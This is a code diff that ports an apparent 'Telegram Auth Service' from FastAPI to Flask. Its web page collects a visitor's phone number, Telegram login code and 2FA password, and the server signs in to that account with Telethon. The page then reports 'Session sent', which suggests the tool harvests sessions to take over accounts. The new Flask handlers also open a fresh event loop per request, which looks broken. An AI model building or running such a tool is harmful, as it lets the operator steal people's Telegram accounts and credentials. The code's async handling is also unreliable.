@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Telegram Auth Service v2.0 - بدون Pydantic v2 (سازگار با Python 3.11+)
+Telegram Auth Service - Flask Version
+Compatible with Python 3.11, no Pydantic issues.
 """
 
 import os
@@ -12,15 +13,12 @@ import asyncio
 import logging
 import secrets
 import re
-from typing import Dict, Optional, Any
+import json
+from threading import Thread
 from pathlib import Path
 from datetime import datetime
-from contextlib import asynccontextmanager
 
-from fastapi import FastAPI, Request, HTTPException
-from fastapi.responses import HTMLResponse
-from fastapi.middleware.cors import CORSMiddleware
-import uvicorn
+from flask import Flask, request, jsonify, render_template_string
 import aiosqlite
 from telethon import TelegramClient, events, Button
 from telethon.errors import (
@@ -100,7 +98,7 @@ class DB:
             await db.commit()
         log.info("DB ready")
 
-    async def add_user(self, data: Dict):
+    async def add_user(self, data: dict):
         async with aiosqlite.connect(self.path) as db:
             cur = await db.execute("SELECT user_id FROM users WHERE phone = ?", (data['phone'],))
             row = await cur.fetchone()
@@ -128,6 +126,8 @@ class AuthManager:
         self.phone_map = {}
         self.lock = asyncio.Lock()
         self.cleanup_task = None
+        self.loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(self.loop)
 
     async def start_cleanup(self):
         async def loop():
@@ -178,7 +178,7 @@ class AuthManager:
     async def send_code(self, phone: str):
         phone = sanitize_phone(phone)
         if not validate_phone(phone):
-            raise HTTPException(400, "Invalid phone")
+            raise ValueError("Invalid phone format")
         s = await self.create_session(phone)
         s['phone'] = phone
         try:
@@ -187,17 +187,17 @@ class AuthManager:
             s['state'] = 'code_sent'
             return {"session_id": s['client'].session.filename.stem}
         except FloodWaitError as e:
-            raise HTTPException(429, f"Wait {e.seconds}s")
+            raise ValueError(f"Wait {e.seconds}s")
         except Exception as e:
-            raise HTTPException(400, str(e))
+            raise ValueError(str(e))
 
     async def verify_code(self, session_id: str, code: str):
         sid = session_id
         if sid not in self.active:
-            raise HTTPException(400, "Invalid session")
+            raise ValueError("Invalid session")
         s = self.active[sid]
         if s['state'] != 'code_sent':
-            raise HTTPException(400, "Not waiting for code")
+            raise ValueError("Not waiting for code")
         try:
             await s['client'].sign_in(phone=s['phone'], code=code, phone_code_hash=s['hash'])
             return await self._finalize(s)
@@ -205,22 +205,22 @@ class AuthManager:
             s['state'] = '2fa_needed'
             return {"status": "2fa_required"}
         except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
-            raise HTTPException(400, str(e))
+            raise ValueError(str(e))
         except Exception as e:
-            raise HTTPException(400, str(e))
+            raise ValueError(str(e))
 
     async def verify_2fa(self, session_id: str, password: str):
         sid = session_id
         if sid not in self.active:
-            raise HTTPException(400, "Invalid session")
+            raise ValueError("Invalid session")
         s = self.active[sid]
         if s['state'] != '2fa_needed':
-            raise HTTPException(400, "No 2FA needed")
+            raise ValueError("No 2FA needed")
         try:
             await s['client'].sign_in(password=password)
             return await self._finalize(s)
         except Exception:
-            raise HTTPException(400, "Invalid password")
+            raise ValueError("Invalid password")
 
     async def _finalize(self, s):
         me = await s['client'].get_me()
@@ -387,55 +387,11 @@ class BotManager:
 
 bot_manager = BotManager()
 
-# ========== FASTAPI APP ==========
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    log.info("Starting...")
-    await db.init()
-    await auth.start_cleanup()
-    asyncio.create_task(bot_manager.start())
-    yield
-    await auth.stop_cleanup()
-    if bot_manager.client.is_connected():
-        await bot_manager.client.disconnect()
-    log.info("Shutdown")
+# ========== FLASK APP ==========
+app = Flask(__name__)
 
-app = FastAPI(lifespan=lifespan)
-app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
-
-@app.post("/api/send-code")
-async def api_send_code(request: Request):
-    data = await request.json()
-    phone = data.get("phone")
-    if not phone:
-        raise HTTPException(400, "phone required")
-    res = await auth.send_code(phone)
-    return {"status": "success", "data": {"session_id": res["session_id"]}}
-
-@app.post("/api/verify-code")
-async def api_verify_code(request: Request):
-    data = await request.json()
-    session_id = data.get("session_id")
-    code = data.get("code")
-    if not session_id or not code:
-        raise HTTPException(400, "session_id and code required")
-    res = await auth.verify_code(session_id, code)
-    if res.get("status") == "2fa_required":
-        return {"status": "2fa_required", "data": None}
-    return {"status": "success", "data": res.get("user")}
-
-@app.post("/api/verify-2fa")
-async def api_verify_2fa(request: Request):
-    data = await request.json()
-    session_id = data.get("session_id")
-    password = data.get("password")
-    if not session_id or not password:
-        raise HTTPException(400, "session_id and password required")
-    res = await auth.verify_2fa(session_id, password)
-    return {"status": "success", "data": res.get("user")}
-
-# ========== FRONTEND ==========
-HTML = """
+# HTML template (escaped properly for Python)
+HTML_TEMPLATE = r"""
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -480,7 +436,7 @@ async function req(endpoint, data) {
         body: JSON.stringify(data)
     });
     const json = await res.json();
-    if (!res.ok) throw new Error(json.detail || 'Error');
+    if (!res.ok) throw new Error(json.detail || json.error || 'Error');
     return json;
 }
 
@@ -489,7 +445,7 @@ document.getElementById('btnSend').onclick = async () => {
     if (!phone.match(/^\+?[0-9]{10,15}$/)) { statusEl.textContent = 'Invalid phone'; return; }
     statusEl.textContent = 'Sending...';
     try {
-        const res = await req('/api/send-code', {phone});
+        const res = await req('/send-code', {phone});
         sessionId = res.data.session_id;
         document.getElementById('stepPhone').classList.add('hidden');
         document.getElementById('stepCode').classList.remove('hidden');
@@ -502,7 +458,7 @@ document.getElementById('btnVerify').onclick = async () => {
     if (!code) { statusEl.textContent = 'Enter code'; return; }
     statusEl.textContent = 'Verifying...';
     try {
-        const res = await req('/api/verify-code', {session_id: sessionId, code});
+        const res = await req('/verify-code', {session_id: sessionId, code});
         if (res.status === '2fa_required') {
             document.getElementById('stepCode').classList.add('hidden');
             document.getElementById('step2fa').classList.remove('hidden');
@@ -518,7 +474,7 @@ document.getElementById('btn2fa').onclick = async () => {
     if (!password) { statusEl.textContent = 'Enter password'; return; }
     statusEl.textContent = 'Verifying...';
     try {
-        const res = await req('/api/verify-2fa', {session_id: sessionId, password});
+        const res = await req('/verify-2fa', {session_id: sessionId, password});
         statusEl.textContent = '✅ 2FA success! Session sent.';
     } catch(e) { statusEl.textContent = e.message; }
 };
@@ -533,10 +489,88 @@ document.getElementById('btnBack').onclick = () => {
 </html>
 """
 
-@app.get("/", response_class=HTMLResponse)
-async def root():
-    return HTML
+@app.route("/", methods=["GET"])
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route("/send-code", methods=["POST"])
+def send_code():
+    try:
+        data = request.get_json()
+        phone = data.get("phone")
+        if not phone:
+            return jsonify({"error": "phone required"}), 400
+        # Run async function in existing loop
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        res = loop.run_until_complete(auth.send_code(phone))
+        loop.close()
+        return jsonify({"status": "success", "data": {"session_id": res["session_id"]}})
+    except ValueError as e:
+        return jsonify({"error": str(e)}), 400
+    except Exception as e:
+        log.exception("send_code error")
+        return jsonify({"error": "internal error"}), 500
+
+@app.route("/verify-code", methods=["POST"])
+def verify_code():
+    try:
+        data = request.get_json()
+        session_id = data.get("session_id")
+        code = data.get("code")
+        if not session_id or not code:
+            return jsonify({"error": "session_id and code required"}), 400
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        res = loop.run_until_complete(auth.verify_code(session_id, code))
+        loop.close()
+        if res.get("status") == "2fa_required":
+            return jsonify({"status": "2fa_required"})
+        return jsonify({"status": "success", "data": res.get("user")})
+    except ValueError as e:
+        return jsonify({"error": str(e)}), 400
+    except Exception as e:
+        log.exception("verify_code error")
+        return jsonify({"error": "internal error"}), 500
+
+@app.route("/verify-2fa", methods=["POST"])
+def verify_2fa():
+    try:
+        data = request.get_json()
+        session_id = data.get("session_id")
+        password = data.get("password")
+        if not session_id or not password:
+            return jsonify({"error": "session_id and password required"}), 400
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        res = loop.run_until_complete(auth.verify_2fa(session_id, password))
+        loop.close()
+        return jsonify({"status": "success", "data": res.get("user")})
+    except ValueError as e:
+        return jsonify({"error": str(e)}), 400
+    except Exception as e:
+        log.exception("verify_2fa error")
+        return jsonify({"error": "internal error"}), 500
+
+# ========== RUN BOT IN BACKGROUND ==========
+def run_bot():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(bot_manager.start())
+    loop.run_forever()
 
 # ========== MAIN ==========
 if __name__ == "__main__":
-    uvicorn.run("app:app", host=HOST, port=PORT, log_level="info")
+    # Init DB
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(db.init())
+    loop.run_until_complete(auth.start_cleanup())
+    loop.close()
+
+    # Start bot in a separate thread
+    bot_thread = Thread(target=run_bot, daemon=True)
+    bot_thread.start()
+
+    # Run Flask
+    app.run(host=HOST, port=PORT, debug=False, threaded=True)
